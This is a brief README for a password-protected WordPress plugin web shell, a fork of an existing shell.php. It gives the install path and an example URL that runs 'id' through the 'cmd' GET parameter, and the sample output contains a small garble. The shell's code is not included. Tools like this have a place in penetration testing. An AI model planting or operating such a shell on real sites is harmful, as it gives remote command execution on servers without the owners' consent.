# wp-theshell
Password Protected Shell

Original Plugin : https://github.com/leonjza/wordpress-shell/blob/master/shell.php

This is just an updated version to add a password protection to prevent random's getting the shell access.
```
Execute Commands as the webserver you are serving wordpress with! Shell will probably live at /wp-content/plugins/shell/shell.php. Commands can be given using the 'cmd' GET parameter. Eg: "http://192.168.0.1/wp-content/plugins/shell/shell.php?cmd=id", should provide you with output such as <code>uid=33(www-data) gid=verd33(www-data) groups=33(www-data)</code>
```
